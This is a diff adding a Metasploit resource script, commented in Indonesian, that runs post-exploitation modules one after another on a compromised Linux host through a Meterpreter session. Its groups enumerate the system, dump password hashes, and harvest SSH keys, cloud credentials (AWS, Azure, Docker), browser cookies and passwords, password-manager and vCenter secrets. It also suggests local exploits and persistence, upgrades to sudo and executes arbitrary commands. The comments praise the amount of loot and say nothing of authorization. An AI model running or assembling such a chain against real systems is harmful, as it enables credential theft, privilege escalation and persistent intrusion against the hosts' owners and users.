@@ -1,0 +1,107 @@
+# super_safe_all_post.rc
+# FARREL - Lengkap SEMUA module dari daftar, tapi SUPER SAFE (anti crash/bentrok)
+# Sequential + delay panjang + grup kecil + logging
+# Ganti SESSION sesuai ID Meterpreter kamu (cek: sessions -l)
+# Jalankan perlahan, pantau session tetap hidup!
+
+spool /root/msf_super_safe_all_$(date +%Y%m%d_%H%M%S).log
+setg LogLevel 5
+set TimestampOutput true
+
+echo "[*] MULAI SUPER SAFE MODE - Lengkap tapi anti bentrok/crash"
+echo "[*] Delay 5-10 detik antar module, 15 detik antar grup"
+echo "[*] Session target: #$SESSION (ganti di bawah kalau beda!)"
+
+set SESSION 1   # <-- GANTI INI SESUAI SESSION KAMU !!!
+
+# =============================================
+# Grup 1: Basic Enumeration & System Info (paling aman)
+# =============================================
+use post/linux/gather/enum_system; run; sleep 5
+use post/linux/gather/enum_network; run; sleep 5
+use post/linux/gather/enum_configs; run; sleep 5
+use post/linux/gather/enum_users_history; run; sleep 5
+use post/linux/gather/enum_commands; run; sleep 5
+use post/linux/gather/enum_protections; run; sleep 5
+use post/linux/gather/checkvm; run; sleep 5
+use post/linux/gather/checkcontainer; run; sleep 5
+use post/linux/gather/enum_containers; run; sleep 5
+use post/multi/gather/env; run; sleep 10
+echo "[*] Grup 1 selesai. Session masih hidup? Cek sessions -l kalau perlu pause"
+
+# =============================================
+# Grup 2: Credential Harvesting Utama (paling berharga, aman sequential)
+# =============================================
+use post/linux/gather/hashdump; run; sleep 8
+use post/multi/gather/ssh_creds; run; sleep 8
+use post/multi/gather/aws_keys; run; sleep 8
+use post/multi/gather/netrc_creds; run; sleep 5
+use post/multi/gather/fetchmailrc_creds; run; sleep 5
+use post/multi/gather/gpg_creds; run; sleep 5
+use post/multi/gather/firefox_creds; run; sleep 5
+use post/multi/gather/chrome_cookies; run; sleep 5
+use post/multi/gather/thunderbird_creds; run; sleep 5
+use post/multi/gather/filezilla_client_cred; run; sleep 5
+echo "[*] Grup 2 selesai (creds utama). Loot & creds pasti banyak nih!"
+
+# =============================================
+# Grup 3: Creds Spesifik Apps/Services/Cloud
+# =============================================
+use post/multi/gather/azure_cli_creds; run; sleep 5
+use post/multi/gather/docker_creds; run; sleep 5
+use post/multi/gather/pgpass_creds; run; sleep 5
+use post/multi/gather/remmina_creds; run; sleep 5
+use post/linux/gather/openvpn_credentials; run; sleep 5
+use post/linux/gather/pptpd_chap_secrets; run; sleep 5
+use post/linux/gather/enum_psk; run; sleep 5
+use post/linux/gather/mount_cifs_creds; run; sleep 5
+use post/multi/gather/tomcat_gather; run; sleep 5
+use post/multi/gather/jboss_gather; run; sleep 5
+use post/multi/gather/jenkins_gather; run; sleep 5
+use post/multi/gather/lastpass_creds; run; sleep 5
+use post/linux/gather/vcenter_secrets_dump; run; sleep 8
+use post/linux/gather/f5_loot_mcp; run; sleep 5
+use post/linux/gather/rancher_audit_log_leak; run; sleep 5
+use post/linux/gather/gnome_keyring_dump; run; sleep 5
+echo "[*] Grup 3 selesai. Creds spesifik aman terkumpul"
+
+# =============================================
+# Grup 4: Tambahan Gather & Recon
+# =============================================
+use post/multi/gather/dbeaver; run; sleep 5
+use post/multi/gather/electerm; run; sleep 5
+use post/linux/gather/enum_nagios_xi; run; sleep 5
+use post/multi/recon/local_exploit_suggester; run; sleep 10
+use post/multi/recon/persistence_suggester; run; sleep 5
+use post/multi/recon/sudo_commands; run; sleep 5
+use post/multi/manage/sudo; run; sleep 8   # kalau mau upgrade sudo shell
+echo "[*] Grup 4 selesai"
+
+# =============================================
+# Grup 5: Safe Manage & Utility (non-destructive)
+# =============================================
+use post/multi/manage/zip; run; sleep 5
+use post/multi/manage/set_wallpaper; run; sleep 5
+# Skip record_mic/screenshare karena bisa interactive/hang
+use post/multi/general/execute; run; sleep 5   # kalau butuh exec command custom
+echo "[*] Grup 5 selesai (manage aman)"
+
+# =============================================
+# Akhir: Gunakan multi_post untuk sisanya (lebih clean & sequential internal)
+# =============================================
+echo "[*] Jalankan multi_post untuk module sisanya yang belum tercover"
+use post/multi/manage/multi_post
+set SESSION $SESSION
+set POST_MODULES post/multi/gather/minio_client,post/multi/gather/grub_creds,post/linux/gather/ecryptfs_creds,post/linux/gather/manageengine_password_manager_creds,post/linux/gather/tor_hiddenservices,post/multi/gather/irssi_creds,post/multi/gather/pidgin_cred,post/multi/gather/rubygems_api_key,post/multi/gather/dbvis_enum
+run
+sleep 15
+
+echo "[*] SUPER SAFE MODE SELESAI - SEMUA MODULE SUDAH DIJALANKAN (atau di-skip otomatis)"
+echo "[*] Cek hasil:"
+echo "    loot          → files dumped"
+echo "    creds         → credential store"
+echo "    sessions -l   → pastikan session OK"
+echo "[*] Log lengkap di: /root/msf_super_safe_all_*.log"
+echo "[*] Kalau crash, restart script dari grup terakhir yang berhasil"
+
+spool off
